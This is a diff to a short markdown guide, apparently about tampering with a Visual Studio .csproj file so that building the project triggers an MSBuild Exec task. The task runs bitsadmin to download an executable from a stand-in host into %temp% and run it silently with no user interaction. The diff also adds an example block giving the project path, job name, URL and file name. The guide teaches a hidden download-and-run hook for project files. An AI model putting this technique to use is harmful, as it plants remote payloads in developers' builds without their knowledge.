@@ -40,5 +40,12 @@ We change the 15 to 14 and add InitialTargets="Build"
 
 We use bitsadmin to assign a job that downloads and runs the process after its downloaded in the background and requires no user interaction.  
 ```xml
-<Exec Command="bitsadmin.exe /transfer JOSHN38N http://domain.com/filename.exe %temp%\Demo.exe">```
-
+<Exec Command="bitsadmin.exe /transfer JOSHN38N http://domain.com/filename.exe %temp%\Demo.exe">
+ ```
+## Extra Example: 
+```cshap
+Path = C:\Users\Josh\source\Example\Example\example.csproj
+Job = JOSHN38N;
+rURL = http://domain.com/filename.exe
+fName = Demo.exe
+```
